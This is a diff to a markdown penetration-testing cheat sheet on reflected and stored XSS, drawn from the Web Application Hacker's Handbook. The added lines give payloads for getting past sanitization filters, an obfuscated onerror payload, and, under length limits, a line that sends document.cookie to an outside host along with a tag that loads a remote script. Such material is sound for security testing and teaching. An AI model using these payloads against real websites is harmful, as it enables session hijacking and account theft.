@@ -5,9 +5,9 @@
 ![XSS](https://user-images.githubusercontent.com/68887544/179921615-68aef3f0-3f23-450f-9fa8-2b93b690bb75.png)
 
 
-## 𝐑𝐞𝐟𝐥𝐞𝐜𝐭𝐞𝐝 𝐗𝐒𝐒
+# 𝐑𝐞𝐟𝐥𝐞𝐜𝐭𝐞𝐝 𝐗𝐒𝐒
 
-- Finding Reflected XSS
+## 𝐅𝐢𝐧𝐝𝐢𝐧𝐠 𝐑𝐞𝐟𝐥𝐞𝐜𝐭𝐞𝐝 𝐗𝐒𝐒
 ```
 1. Submit a random string for example: myxssteststring
 2. Identify all locations where this string is reflected in the application’s response
@@ -17,7 +17,7 @@
 circumvent the defense mechanism.
 ```
 
-- Common Reflection Positions
+## 𝐂𝐨𝐦𝐦𝐨𝐧 𝐑𝐞𝐟𝐥𝐞𝐜𝐭𝐢𝐨𝐧 𝐏𝐨𝐬𝐢𝐭𝐢𝐨𝐧𝐬
 
 
 ![Common Reflection Positions](https://user-images.githubusercontent.com/68887544/179921399-fd02889c-d051-4876-bdfc-fb8484de0090.png)
@@ -220,7 +220,69 @@ FF FE 3C 00 73 00 63 00 72 00 69 00 70 00 74 00 ; ÿþ<.s.c.r.i.p.t.
 <img onerror=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;al&#x5c;u0065rt&#x28;1&#x29;&#x27;&#x29; src=a>
 ```
 
+## 𝐁𝐞𝐚𝐭𝐢𝐧𝐠 𝐒𝐚𝐧𝐢𝐭𝐢𝐳𝐚𝐭𝐢𝐨𝐧
+
+- If first occurence of `<script>` is being stripped:
+```
+<script><script>alert(1)</script>
+```
+
+- If the sanitization is being performed recursively
+```
+<scr<script>ipt>alert(1)</script>
+```
+
+- If the filter strips `<script>` recursively and then `<object>` recursively
+```
+<scr<object>ipt>alert(1)</script>
+```
+
+- If quotation marks are being sanitized using `\`, try to check if `\` itself is being escaped or not. If not:
+```
+foo\'; alert(1);//
+```
+
+- Here, if you fi nd that the backslash character is also being properly escaped, but angle brackets are returned unsanitized, you can use the following attack:
+```
+</script><script>alert(1)</script>
+
+The attack works because browsers’ parsing of HTML
+tags takes precedence over their parsing of embedded JavaScript
+```
+
+- If you can inject into a script, but you cannot use quotation marks because these are being escaped, you can use the `String.fromCharCode` technique to construct strings without the need for delimiters
+
+- In cases where the script you are injecting into resides within an event handler, rather than a full script block, you may be able to HTML-encode your quotation marks to bypass the application’s sanitization and break out of the string you control.
+```
+foo&apos;; alert(1);//
+```
+
+## 𝐁𝐞𝐚𝐭𝐢𝐧𝐠 𝐋𝐞𝐧𝐠𝐭𝐡 𝐋𝐢𝐦𝐢𝐭𝐬
+
+- if you are injecting into an existing script, the following 28-byte command transmits the user’s cookies to the server with hostname `a`:
+```
+open("//a/"+document.cookie)
+```
+
+- if you are injecting straight into HTML, the following 30-byte tag loads and executes a script from the server with hostname `a`:
+```
+<script src=http://a></script>
+```
+
+# 𝐒𝐭𝐨𝐫𝐞𝐝 𝐗𝐒𝐒
+
+## 𝐅𝐢𝐧𝐝𝐢𝐧𝐠 𝐒𝐭𝐨𝐫𝐞𝐝 𝐗𝐒𝐒
+
+- Submit unique value to each parameter and make note of every place where they are being reflected.
+- Each place might have their own different sanitization in place
+- If there is a file upload or download functionality, always probe it for stored xss.
 
 
 
+
+## 𝐑𝐞𝐟𝐞𝐫𝐞𝐧𝐜𝐞𝐬:
+
+- Web Application Hacker's Handbook 
+  - Finding and Exploiting Reflected XSS Vulnerabilities
+  - Finding and Exploiting Stored XSS Vulnerabilities
 
